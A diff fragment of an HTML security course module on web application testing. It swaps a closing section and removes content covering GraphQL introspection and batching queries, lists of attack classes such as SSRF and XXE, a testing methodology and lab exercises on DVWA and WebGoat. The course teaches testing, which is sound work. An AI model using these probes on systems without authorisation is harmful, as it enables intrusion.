+            tools with manual testing techniques. Understanding the OWASP Top 10 provides a 
+            foundation, but comprehensive testing must also include business logic and 
+            application-specific vulnerabilities.
+        </p>
+
+        <div class="highlight">
+            <strong>Remember:</strong> Web applications are complex systems with many potential 
+            security weaknesses. Thorough testing requires patience, creativity, and deep 
+            understanding of web technologies.
+        </div>
+
+        <h2>Next Steps</h2>
+        <p>In the next module, we'll explore wireless network security testing, including Wi-Fi protocols, attack methods, and security assessment techniques.</p>
     </div>
-
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-cyan-400 mb-2">GraphQL Security Testing</h5>
-      <div class="font-mono text-sm text-slate-300 space-y-1">
-        <p><span class="text-cyan-400">query IntrospectionQuery { __schema { types { name } } }</span> - Schema introspection</p>
-        <p><span class="text-cyan-400">query { __type(name: "User") { fields { name type { name } } } }</span> - Type information</p>
-        <p><span class="text-cyan-400">query { user(id: "1") { ... } user(id: "2") { ... } }</span> - Query batching</p>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 6: Advanced Attack Techniques</h3>
-
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Advanced Attacks" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">Advanced attack techniques target modern web application security mechanisms</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    Advanced attack techniques target sophisticated security mechanisms and modern web application architectures that may not be covered by traditional testing approaches.
-  </p>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Client-Side Attacks</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• DOM-based Cross-Site Scripting (XSS)</li>
-        <li>• Cross-Site Request Forgery (CSRF)</li>
-        <li>• Client-side template injection</li>
-        <li>• WebSocket security testing</li>
-        <li>• PostMessage vulnerabilities</li>
-        <li>• Browser cache poisoning</li>
-      </ul>
-    </div>
-
-    <div class="bg-slate-800 rounded-lg p-4">
-      <h4 class="text-lg font-semibold text-slate-100 mb-2">Server-Side Attacks</h4>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Server-Side Request Forgery (SSRF)</li>
-        <li>• Server-side template injection</li>
-        <li>• XXE (XML External Entity) attacks</li>
-        <li>• Insecure deserialization</li>
-        <li>• LDAP injection vulnerabilities</li>
-        <li>• File inclusion attacks</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 7: Testing Methodology</h3>
-
-  <div class="mb-8">
-    <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Testing Methodology" class="w-full h-64 object-cover rounded-lg mb-4">
-    <p class="text-slate-400 text-sm text-center">Systematic testing methodologies ensure comprehensive security assessment coverage</p>
-  </div>
-
-  <p class="text-slate-300 mb-4">
-    A systematic testing methodology ensures comprehensive coverage and helps organize testing activities for maximum effectiveness.
-  </p>
-
-  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">Testing Phases</h4>
-    <div class="space-y-3">
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-blue-400 mb-1">Phase 1: Information Gathering</h5>
-        <p class="text-slate-300 text-sm">Technology stack identification, application mapping, and attack surface analysis</p>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-green-400 mb-1">Phase 2: Automated Scanning</h5>
-        <p class="text-slate-300 text-sm">Comprehensive vulnerability scanning using multiple tools and techniques</p>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-yellow-400 mb-1">Phase 3: Manual Testing</h5>
-        <p class="text-slate-300 text-sm">Business logic testing, authentication assessment, and complex vulnerability validation</p>
-      </div>
-      <div class="bg-slate-900 rounded p-3">
-        <h5 class="font-semibold text-red-400 mb-1">Phase 4: Exploitation</h5>
-        <p class="text-slate-300 text-sm">Proof-of-concept development and impact demonstration</p>
-      </div>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Practical Exercises</h3>
-
-  <div class="space-y-4 mb-6">
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-slate-100 mb-2">Exercise 1: OWASP Top 10 Testing</h5>
-      <p class="text-slate-300 text-sm mb-2">Practice identifying and exploiting OWASP Top 10 vulnerabilities:</p>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Set up vulnerable web applications (DVWA, WebGoat)</li>
-        <li>• Systematically test for each OWASP Top 10 category</li>
-        <li>• Document findings with proof-of-concept exploits</li>
-        <li>• Develop remediation recommendations</li>
-      </ul>
-    </div>
-
-    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
-      <h5 class="font-semibold text-slate-100 mb-2">Exercise 2: API Security Assessment</h5>
-      <p class="text-slate-300 text-sm mb-2">Conduct comprehensive API security testing:</p>
-      <ul class="text-slate-300 text-sm space-y-1">
-        <li>• Enumerate API endpoints and functionality</li>
-        <li>• Test authentication and authorization mechanisms</li>
-        <li>• Perform input validation and injection testing</li>
-        <li>• Analyze rate limiting and business logic</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3 class="text-xl font-semibold text-slate-100 mb-4">Key Takeaways</h3>
-  <p class="text-slate-300 mb-6">
-    Web application security testing requires a combination of automated tools and manual techniques to identify the full range of potential vulnerabilities. Understanding modern web application architectures, the OWASP Top 10, and advanced attack techniques is essential for comprehensive security assessments. Always combine automated scanning with manual testing to identify business logic flaws and complex vulnerabilities. Remember that web application security is constantly evolving, requiring continuous learning and adaptation of testing methodologies.
-  </p>
-
-  <div class="bg-gradient-to-r from-slate-800 to-slate-700 rounded-lg p-6 border border-slate-600">
-    <h4 class="text-lg font-semibold text-slate-100 mb-3">🚀 Next: System Exploitation</h4>
-    <p class="text-slate-300">
-      Module 9 explores system exploitation techniques, including buffer overflows, privilege escalation, and advanced exploitation frameworks like Metasploit.
-    </p>
-  </div>
-</div>
+</body>
+</html>
